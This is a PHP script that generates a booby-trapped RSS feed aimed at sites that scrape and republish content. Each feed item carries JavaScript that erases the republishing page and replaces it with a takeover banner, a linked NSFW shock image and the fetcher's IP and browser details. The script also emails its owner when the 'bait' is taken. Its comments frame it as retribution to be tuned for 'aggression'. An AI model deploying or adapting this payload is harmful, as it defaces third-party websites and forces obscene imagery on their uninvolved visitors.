<?php

function makeItem() {
	#rand() suffers from PHP's integer limit of 10 characters, so let's concatenate to make a unique id:
	$uid = rand(100000000, 999999999).rand(100000000, 999999999);
	
	#change the "unique string" to your own - you'll want to use this to search for this in Google
	$forensics = "<div>Unique String (for tracking): i35H361RKFI2Li0h9657K</div>
	<div>Original Request IP: ".$_SERVER['REMOTE_ADDR']." (".$_SERVER['REMOTE_HOST'].")</div>
	<div>Original Request Time + Date: ".date('c',$_SERVER['REQUEST_TIME'])."</div>
	<div>Original Request User Agent: ".$_SERVER['HTTP_USER_AGENT']."</div>
	<div>Original Request Referer: ".$_SERVER['HTTP_REFERER']."</div>"; 
	
	#change the contents of the post to suit your level of aggression and retribution. nb: Tubgirl.jpg is NSFW.
	$post = "<p></p><div id=\"takeover\">
	<h2>THIS WEBSITE STEALS CONTENT</h2>
	<p>This website steals content by taking other people's RSS feeds and republishing them as if they were their own.</p>
	<p>We've had enough of you taking our content and so hopefully this will encourage you to stop.</p>
	<p><img src=\"http://images.encyclopediadramatica.com/images/9/98/Tubgirl.jpg\" /></p>
	<p>
	<h2>backtrace this shit</h2>
	".$forensics."
	<script type=\"text/javascript\">
	document.head.innerHTML = \"\";
	document.body = document.getElementById('takeover');
	</script>
	</div>";
	
	$item = "<item> 
			<title>THIS WEBSITE STEALS CONTENT</title> 
			<link>http://google.com/#".$uid."</link> 
			<pubDate>".date(DATE_RFC822)."</pubDate> 
			<guid isPermaLink=\"false\">".$uid."</guid> 
			<content:encoded><![CDATA[".$post."]]></content:encoded>
			</item>
			
			";
	return $item;
}
header ("content-type: text/xml");
echo "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"; #quick hack way to deal with PHP raising an error if '<?xml' is parsed outside of the PHP tags.
?>
<rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	> 
 
<channel> 
	<title>THIS WEBSITE STEALS CONTENT</title> 
	<link>http://google.com/#<?php echo rand(100000000, 999999999) ?></link> 
	<description>fuck you</description> 
	<lastBuildDate><?php echo date(DATE_RFC822) ?></lastBuildDate> 
	<language>en</language> 
		<?php echo str_repeat(makeItem(), 30); ?>
	</channel> 
</rss> 
<?php mail("your.emaill@address.com", $_SERVER['REMOTE_ADDR']." took the bait!", "see logs!"); #send yourself an email when the poison bait is taken! ?>

